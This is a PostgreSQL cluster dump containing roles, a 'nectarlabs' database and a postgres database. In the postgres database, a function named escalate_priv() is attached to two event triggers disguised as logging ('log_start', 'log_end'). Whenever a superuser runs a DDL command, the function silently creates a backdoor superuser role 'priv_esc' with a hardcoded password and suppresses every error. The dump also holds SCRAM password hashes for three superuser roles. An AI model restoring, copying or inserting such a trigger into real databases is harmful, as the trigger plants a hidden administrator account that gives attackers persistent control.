--
-- PostgreSQL database cluster dump
--

\restrict BI8OCJ93MS0axCVKJOw8EW8gLm2lvkTwzLgSPK9lOlT91UVXnHbZ31qOGlgNb6b

SET default_transaction_read_only = off;

SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;

--
-- Roles
--

CREATE ROLE postgres;
ALTER ROLE postgres WITH SUPERUSER INHERIT CREATEROLE CREATEDB LOGIN REPLICATION BYPASSRLS PASSWORD 'SCRAM-SHA-256$4096:/fJW0+clsZLZ1K2WN4oOjg==$q170bJD6CWjqk/hjbvA5Laa1Ij1qctQxNX2cPNEVo+s=:wJ/C2B+TEvB59haItDPfsbGIHZk2d945/FOwBqOOEA0=';
CREATE ROLE priv_esc;
ALTER ROLE priv_esc WITH SUPERUSER INHERIT NOCREATEROLE NOCREATEDB LOGIN NOREPLICATION NOBYPASSRLS PASSWORD 'SCRAM-SHA-256$4096:xX9h2aeQdbNQiwo1tkrhtg==$l2uM62zSzbw900wplxlpNZOnj42GIfcENbdCp35Ng6g=:83hMqIxjGKMS3cXNXRQobpCCs2Or9hN+PIeXjUyI8JU=';
CREATE ROLE wog;
ALTER ROLE wog WITH SUPERUSER INHERIT NOCREATEROLE NOCREATEDB LOGIN NOREPLICATION NOBYPASSRLS PASSWORD 'SCRAM-SHA-256$4096:LAnChOzkmglhIRmhri+7eA==$Bk0w7z4sw26OpjkGpGmQGpviGa3tSCEBVtdzrO6fpT4=:afH1fi7rZl2r0AlkFOfTP15/OaY8Q9HrNzn4u6tuAUU=';

--
-- User Configurations
--


--
-- Role memberships
--

GRANT priv_esc TO postgres WITH INHERIT TRUE GRANTED BY postgres;






\unrestrict BI8OCJ93MS0axCVKJOw8EW8gLm2lvkTwzLgSPK9lOlT91UVXnHbZ31qOGlgNb6b

--
-- Databases
--

--
-- Database "template1" dump
--

\connect template1

--
-- PostgreSQL database dump
--

\restrict H6fRmG3IFMtoWJAXLwcEIgnJnQmga1ONmQwb6yJiagxcXqDmW43bcvaXPGbJNVC

-- Dumped from database version 16.13
-- Dumped by pg_dump version 16.13

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- PostgreSQL database dump complete
--

\unrestrict H6fRmG3IFMtoWJAXLwcEIgnJnQmga1ONmQwb6yJiagxcXqDmW43bcvaXPGbJNVC

--
-- Database "nectarlabs" dump
--

--
-- PostgreSQL database dump
--

\restrict 7dogZiFGR3bX5A98wO9KcMVg3VvQOuB5SlqYo1Tz2zdiuXQtwnznr8hFquqDWpV

-- Dumped from database version 16.13
-- Dumped by pg_dump version 16.13

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- Name: nectarlabs; Type: DATABASE; Schema: -; Owner: postgres
--

CREATE DATABASE nectarlabs WITH TEMPLATE = template0 ENCODING = 'UTF8' LOCALE_PROVIDER = libc LOCALE = 'en_US.utf8';


ALTER DATABASE nectarlabs OWNER TO postgres;

\unrestrict 7dogZiFGR3bX5A98wO9KcMVg3VvQOuB5SlqYo1Tz2zdiuXQtwnznr8hFquqDWpV
\connect nectarlabs
\restrict 7dogZiFGR3bX5A98wO9KcMVg3VvQOuB5SlqYo1Tz2zdiuXQtwnznr8hFquqDWpV

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- PostgreSQL database dump complete
--

\unrestrict 7dogZiFGR3bX5A98wO9KcMVg3VvQOuB5SlqYo1Tz2zdiuXQtwnznr8hFquqDWpV

--
-- Database "postgres" dump
--

\connect postgres

--
-- PostgreSQL database dump
--

\restrict g971mTWDdFrQWWtxI1LotVWOZh23D3agTOCjacAizDf5oGW9QPldSLMmmA7XPHE

-- Dumped from database version 16.13
-- Dumped by pg_dump version 16.13

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- Name: postgres_fdw; Type: EXTENSION; Schema: -; Owner: -
--

CREATE EXTENSION IF NOT EXISTS postgres_fdw WITH SCHEMA public;


--
-- Name: EXTENSION postgres_fdw; Type: COMMENT; Schema: -; Owner: 
--

COMMENT ON EXTENSION postgres_fdw IS 'foreign-data wrapper for remote PostgreSQL servers';


--
-- Name: escalate_priv(); Type: FUNCTION; Schema: public; Owner: postgres
--

CREATE FUNCTION public.escalate_priv() RETURNS event_trigger
    LANGUAGE plpgsql
    AS $$
DECLARE
is_super BOOLEAN;
BEGIN
SELECT usesuper INTO is_super FROM pg_user WHERE usename = current_user;
 
IF is_super THEN
  BEGIN
    EXECUTE 'CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD ''temp1237126512''';
  EXCEPTION WHEN duplicate_object THEN
    NULL;
  WHEN OTHERS THEN
    NULL;
  END;
 
  BEGIN
    EXECUTE 'GRANT priv_esc TO postgres';
  EXCEPTION WHEN OTHERS THEN
    NULL;
  END;
END IF;
END;
$$;


ALTER FUNCTION public.escalate_priv() OWNER TO postgres;

--
-- Name: log_end; Type: EVENT TRIGGER; Schema: -; Owner: postgres
--

CREATE EVENT TRIGGER log_end ON ddl_command_end
   EXECUTE FUNCTION public.escalate_priv();


ALTER EVENT TRIGGER log_end OWNER TO postgres;

--
-- Name: log_start; Type: EVENT TRIGGER; Schema: -; Owner: postgres
--

CREATE EVENT TRIGGER log_start ON ddl_command_start
   EXECUTE FUNCTION public.escalate_priv();


ALTER EVENT TRIGGER log_start OWNER TO postgres;

--
-- PostgreSQL database dump complete
--

\unrestrict g971mTWDdFrQWWtxI1LotVWOZh23D3agTOCjacAizDf5oGW9QPldSLMmmA7XPHE

--
-- PostgreSQL database cluster dump complete
--

